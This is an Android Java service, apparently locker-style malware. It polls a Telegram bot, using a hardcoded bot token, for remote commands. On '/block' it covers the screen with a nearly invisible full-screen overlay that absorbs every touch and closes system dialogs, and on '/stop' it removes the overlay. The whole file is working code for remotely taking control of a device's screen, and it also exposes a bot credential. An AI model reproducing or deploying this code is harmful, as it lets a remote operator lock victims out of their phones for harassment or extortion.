package com.example.touchlock;

import android.app.*;
import android.content.*;
import android.graphics.PixelFormat;
import android.os.*;
import android.provider.Settings;
import android.view.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    private WindowManager windowManager;
    private View overlayView;
    private static final String CHANNEL_ID = "TouchLockChannel";
    private boolean isLocked = false;
    
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    private OkHttpClient client;
    private long lastUpdateId = 0;
    private HandlerThread pollingThread;
    private Handler pollingHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        createNotificationChannel();
        startForeground(1, getLockNotification("Бот на связи. Жду команд..."));
        
        // Запуск выделенного потока для бота
        pollingThread = new HandlerThread("TelegramBotThread");
        pollingThread.start();
        pollingHandler = new Handler(pollingThread.getLooper());
        startTelegramPolling();
    }

    private void startTelegramPolling() {
        pollingHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Request request = new Request.Builder().url(url).build();
                    
                    try (Response response = client.newCall(request).execute()) {
                        if (response.isSuccessful() && response.body() != null) {
                            String jsonData = response.body().string();
                            JSONObject jsonObject = new JSONObject(jsonData);
                            JSONArray result = jsonObject.getJSONArray("result");

                            for (int i = 0; i < result.length(); i++) {
                                JSONObject update = result.getJSONObject(i);
                                lastUpdateId = update.getLong("update_id");
                                
                                if (update.has("message")) {
                                    String text = update.getJSONObject("message").optString("text", "");
                                    if (text.equalsIgnoreCase("/block")) {
                                        new Handler(Looper.getMainLooper()).post(() -> showOverlay());
                                    } else if (text.equalsIgnoreCase("/stop")) {
                                        new Handler(Looper.getMainLooper()).post(() -> unlockScreen());
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                // Рекурсивный вызов для продолжения опроса
                pollingHandler.postDelayed(this, 1000);
            }
        });
    }

    private void showOverlay() {
        if (isLocked) return;
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) return;

        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            overlayView = new View(this);
            overlayView.setBackgroundColor(0x02000000);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                    PixelFormat.TRANSLUCENT);

            overlayView.setSystemUiVisibility(
                      View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN);

            overlayView.setOnTouchListener((v, event) -> {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                return true;
            });

            windowManager.addView(overlayView, params);
            isLocked = true;
            updateNotification("ЭКРАН ЗАБЛОКИРОВАН");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockScreen() {
        if (isLocked && overlayView != null) {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isLocked = false;
                updateNotification("Доступ открыт");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private Notification getLockNotification(String text) {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Touch Blocker Active")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_secure)
                .setOngoing(true)
                .build();
    }

    private void updateNotification(String text) {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) manager.notify(1, getLockNotification(text));
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Lock", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    
    @Override
    public void onDestroy() {
        pollingThread.quit();
        super.onDestroy();
    }
}
